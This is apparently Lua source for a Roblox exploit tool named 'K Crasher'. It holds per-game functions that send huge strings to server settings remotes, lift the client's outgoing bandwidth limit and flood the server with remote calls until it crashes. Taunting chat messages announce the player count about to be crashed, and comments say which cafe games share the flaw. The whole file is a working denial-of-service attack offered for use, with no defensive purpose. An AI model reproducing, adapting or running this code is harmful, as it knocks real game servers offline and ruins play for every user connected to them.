	local service = game:GetService('LogService').MessageOut:Connect(function(a,b)
		if b == Enum.MessageType.MessageError then if a:find('SettingsController') and a:find('attempt to iterate') then pcall(function() task.cancel(core) end) end end
	end)

	asst = task.spawn(function()
		while task.wait() do 
			if _G.um ~= nil and typeof(_G.um) == 'string' and _G.um:len() >= 9500000 then 
				print('done');
				if coroutine.status(core) ~= 'dead' then
					pcall(function() task.cancel(core); end)
				end
				return
			end
		end
	end)
	core = task.spawn(function()
		--TODO: decide if 2 is good?
		--for i = 1, 2 do
			if _G.um ~= nil and typeof(_G.um) == 'string' and _G.um:len() >= 9500000 then print('done2'); task.cancel(core) return end
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge);
			SettingsService.RF.Set:InvokeServer({
									[LongString] = {
																		[LongString] = 0.2
									},
									[LongString..'1'] = {
																		[LongString] = 0.1,
																		["DisableExtraVisuals"] = false,
																		["AimIndicatorPrimarySize"] = 1,
																		["LeftAimOffsetX"] = -1.7,
																		["AimIndicatorSecondarySize"] = 1,
																		["LeftAimOffsetY"] = 0.1,
																		["AimIndicatorPrimaryColor"] = {
																											["B"] = 1,
																											["Type"] = 'Color3',
																											["G"] = 1,
																											["R"] = 1
																		},
																		["ShakeRoughness"] = 2,
																		["RightAimOffsetX"] = 1.8,
																		["DisableSeeThrough"] = false,
																		["ShakeMagnitude"] = 2.5,
																		["AimIndicatorSecondaryColor"] = {
																											["B"] = 1,
																											["Type"] = 'Color3',
																											["G"] = 1,
																											["R"] = 1
																		}
									},
									[LongString] = {
																		["NoArmorSpawn"] = false
									},
									["Audio"] = {
																		["DynamicReverb"] = true,
																		["AlarmVolume"] = 1,
																		["EventVolume"] = 0.5,
																		["SFXVolume"] = 5,
																		["MusicVolume"] = 1
									},
									["Graphics"] = {
																		["SpinFans"] = false,
																		["ExpStreaming"] = true,
																		["DisableColorCorrection"] = false,
																		["VolumetricSmoke"] = true,
																		["DisableTextures"] = false,
																		["RemoveProps"] = true,
									},
									["Keybinds"] = {
																		["HideAllKeybinds"] = false,
																		["HideBasicKeybinds"] = false
									}
})
		--end
		pcall(function() task.cancel(core) end)
	end)

	repeat task.wait() until coroutine.status(core) == 'dead' or core == nil
	task.cancel(asst)
	service:Disconnect();

	--[[	
	for i = 1, 2 do
		if _G.um ~= nil and typeof(_G.um) == 'string' and _G.um:len() >= 9500000 then print('done'); return end
		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge);
		SettingsService.RF.Set:InvokeServer({LongString});
	end
	]]
	--end

local randomTeams = {"BR","CS"}
local team = randomTeams[math.random(1,#randomTeams)]
	game:GetService("ReplicatedStorage"):FindFirstChild("SetTeamAndSpawn", true):InvokeServer(team,team)
task.wait(.25)
game:GetService("ReplicatedStorage"):FindFirstChild("SetChannel", true):InvokeServer("GEN")
game:GetService("ReplicatedStorage"):FindFirstChild("SetActive", true):InvokeServer(true)

local numberofPlayers = tostring(#game:GetService('Players'):GetPlayers())
game:GetService("ReplicatedStorage"):FindFirstChild("Chat", true):InvokeServer(([[
.
.
.
we back at it again :3
K Crasher on top - %s bouta get crashed 🥱
K Crasher on top - %s bouta get crashed 🥱
K Crasher on top - %s bouta get crashed 🥱
.
.
.
.
]]):format(numberofPlayers,numberofPlayers,numberofPlayers))

	printconsole('Game server completed sending request!')
	printconsole('Attempting to crash')

	for i = 1,3  do
		game:GetService('RunService').RenderStepped:Connect(function()
		for i = 1, 6500 do
			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
				spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
				pcall(function()
					SettingsService.RF.Get:InvokeServer()
				end)
			end
		end
	end)
	end

	wait(125)
	printconsole('Client did not crash server within 125 seconds of Get Request.')
	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 125 seconds of last Get Request')
end
function C.K_3226555017()
	repeat wait() until game:IsLoaded()
	printconsole('Crashing..')

	--game:GetService("ReplicatedStorage").Team:FireServer('ScD');
	printconsole('Sending request to game server... (This should not take long)')

	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)

	game:GetService("ReplicatedStorage").Settings:InvokeServer('Set',{LongString})
	printconsole('Client completed sending request!')
--[[
wait(4)
warn('Sending discord invite via Radio.')
game:GetService("ReplicatedStorage").Team:FireServer('ScD');
wait(8)
local msg = ('K Crasher on top - %s bouta get crashed 🥱 gg/KyGkwTRRxD'):format(#game:GetService('Players'):GetPlayers())
game:GetService("ReplicatedStorage").Team.Radio:FireServer("msg", msg, "SCPF COMMUNICATIONS");
wait(.75)
game:GetService("ReplicatedStorage").Team.Radio:FireServer("msg", msg, "CLASS-D COMMUNICATIONS");
wait(.75)
game:GetService("ReplicatedStorage").Team:FireServer('mainmenu');
wait(1)
]]
	printconsole('Attempting to crash...')
	game:GetService('RunService').RenderStepped:Connect(function()
		for i = 1, 6500 do
			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
				spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
				pcall(function()
					game:GetService("ReplicatedStorage").Settings:InvokeServer('Get')
				end)    
			end
		end
	end)

	wait(120)
	printconsole('Client did not crash server within 120 seconds of Get Request.')
	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 120 seconds of last Get Request')

end
function C.K_3243063589()
--Fun Fact: First game in around 6 months! 5/27/24
-- One of the biggest cafe games on Roblox :3
repeat wait() until game:IsLoaded()
printconsole('Crashing..')

printconsole('Sending request to game server... (This should not take long)')
game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
game:GetService('ReplicatedStorage'):FindFirstChild("TryToggleSetting", true):InvokeServer("ShiftLock", LongString)

printconsole('Completed sending request...')
printconsole('Attempting to crash...')

game:GetService('RunService').RenderStepped:Connect(function()
	for i = 1, 6500 do
		for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
			spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
			pcall(function()
			game:GetService('ReplicatedStorage'):FindFirstChild("GetUserSettings", true):InvokeServer()
			end)
		end
	end
end)
wait(120)
printconsole('Client did not crash server within 120 seconds of Get Request.')
game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 120 seconds of last Get Request')
		
end
function C.K_4375619868()
--ANother cafe game vuln to the same exploit the last 3 ^ above have 🤦
repeat wait() until game:IsLoaded()
printconsole('Crashing..')

printconsole('Sending request to game server... (This should not take long)')
game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
game:GetService('ReplicatedStorage'):FindFirstChild("ToggleSetting", true):FireServer("DisableNPCVoice",LongString);

printconsole('Completed sending request...')
printconsole('Attempting to crash...')
game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(('K Crasher on top - %s bouta get crashed 🥱'):format(#game:GetService('Players'):GetPlayers()))
spawn(function() task.wait(15)
game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(('K Crasher on top - %s bouta get crashed 🥱'):format(#game:GetService('Players'):GetPlayers())) 
while task.wait(15) do
game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(('K Crasher on top - %s bouta get crashed 🥱'):format(#game:GetService('Players'):GetPlayers()))
end
end)
game:GetService('RunService').RenderStepped:Connect(function()
	for i = 1, 6500 do
		for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
			spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
			pcall(function()
			game:GetService("ReplicatedStorage").Packages.Knit.Services.SettingsService.RF.GetSettingValue:InvokeServer("DisableNPCVoice");
			end)
		end
	end
end)
wait(120)
printconsole('Client did not crash server within 120 seconds of Get Request.')
game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 120 seconds of last Get Request')
		
end
C.BasicSetup()
C['K_'..game.PlaceId]()
-- End of Crash Methods
